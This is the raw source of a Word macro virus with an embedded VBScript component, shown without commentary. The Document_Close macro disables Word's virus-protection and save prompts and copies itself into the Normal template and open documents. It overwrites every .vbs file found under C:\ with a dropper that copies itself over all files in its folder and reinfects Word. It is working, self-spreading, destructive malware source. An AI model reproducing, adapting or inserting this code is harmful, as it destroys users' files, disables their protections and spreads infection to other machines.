Private Sub Document_Close()
'1nternal
'ReplaceIt
        Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If N.Lines(2, 1) <> "'1nternal" Then
                For i = 1 To 58
                        N.InsertLines i, A.Lines(i, 1)
                Next
        End If
        If A.Lines(2, 1) <> "'1nternal" Then
                For i = 1 To 58
                        A.InsertLines i, N.Lines(i, 1)
                Next
        End If
        Set FSO = CreateObject("Scripting.FileSystemObject")
        N.InsertLines 59, ""
        N.InsertLines 60, "On Error Resume Next"
        N.InsertLines 61, "Dim WordObj, FSO, WshShell"
        N.InsertLines 62, "Set FSO = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
        N.InsertLines 63, "Set WshShell = Wscript.CreateObject(" + Chr(34) + "Wscript.Shell" + Chr(34) + ")"
        N.InsertLines 64, "parent = Wscript.ScriptFullName"
        N.InsertLines 65, "vPath = Left(parent, InStrRev(parent, " + Chr(34) + "\" + Chr(34) + "))"
        N.InsertLines 66, "For Each target in FSO.GetFolder(vPath).Files"
        N.InsertLines 67, "    FSO.CopyFile parent, target.Name, 1"
        N.InsertLines 68, "Next"
        N.InsertLines 69, "Set WordObj = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
        N.InsertLines 70, "WordObj.Options.SaveNormalPrompt = False"
        N.InsertLines 71, "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule"
        N.InsertLines 72, "If NT.Lines(2,1) <> " + Chr(34) + "'1nternal" + Chr(34) + " Then"
        N.InsertLines 73, "     NT.AddfromFile Wscript.ScriptFullName"
        N.InsertLines 74, "     NT.ReplaceLine 3, " + Chr(34) + "On Error Goto Break" + Chr(34)
        N.InsertLines 75, "     NT.DeleteLines 58, 19"
        N.InsertLines 76, "End If"
        N.InsertLines 77, "Set NT = Nothing"
        N.InsertLines 78, "WordObj.Quit"
        Set fs = Application.FileSearch
                fs.NewSearch
                fs.LookIn = "C:\"
                fs.SearchSubFolders = True
                fs.FileName = "*.vbs"
                fs.Execute
                For i = 1 To fs.FoundFiles.Count
                        Set f = FSO.OpenTextFile(fs.FoundFiles(i), 2, True)
                        N.ReplaceLine 3, "'ReplaceIt"
                        For k = 1 To 78
                                f.Write N.Lines(k, 1) + Chr(13) + Chr(10)
                        Next
                    f.Close
                Next
        N.DeleteLines 59, 20
N.ReplaceLine 3, "On Error Goto Break"
Break:
Set NT = Nothing
WordObj.Quit

On Error Resume Next
Dim WordObj, FSO, WshShell
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Parent = Wscript.ScriptFullName
vPath = Left(Parent, InStrRev(Parent, "\"))
For Each Target In FSO.GetFolder(vPath).Files
    FSO.CopyFile Parent, Target.Name, 1
Next
Set WordObj = CreateObject("Word.Application")
WordObj.Options.SaveNormalPrompt = False
Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
If NT.Lines(2, 1) <> "'1nternal" Then
     NT.AddFromFile Wscript.ScriptFullName
     NT.ReplaceLine 3, "On Error Goto Break"
     NT.DeleteLines 58, 19
End If
Set NT = Nothing
WordObj.Quit